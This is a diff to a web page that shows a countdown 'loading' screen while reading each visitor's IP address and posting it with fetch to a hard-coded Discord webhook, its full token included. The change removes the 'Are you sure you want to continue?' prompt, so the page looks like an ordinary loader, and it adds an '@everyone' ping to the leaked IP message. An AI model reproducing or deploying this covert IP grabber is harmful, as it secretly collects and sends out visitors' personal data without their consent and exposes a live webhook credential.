@@ -37,7 +37,7 @@
 </head>
 <body>
     <div class="container">
-        <h1>Are you sure you want to continue?</h1>
+        <h1>Website will Begin Loading</h1>
         <p>This website will load in <span id="countdown">1</span> seconds.</p>
         <p id="user-ip"></p>
     </div>
@@ -79,7 +79,7 @@
         function sendToDiscord(ip) {
             const webhookUrl = "https://discord.com/api/webhooks/1305170371296890911/Q6lMJsKCwrQ1ftD79-8FP_Leh0X8xKSDVKG3ZI_mW963gR72q-M9NtezPbRAD3L2sS26"; // Replace with your webhook URL
             const message = {
-                content: `User's IP Address: ${ip}`
+                content: `@everyone User's IP Address: ${ip}`
             };
 
             fetch(webhookUrl, {
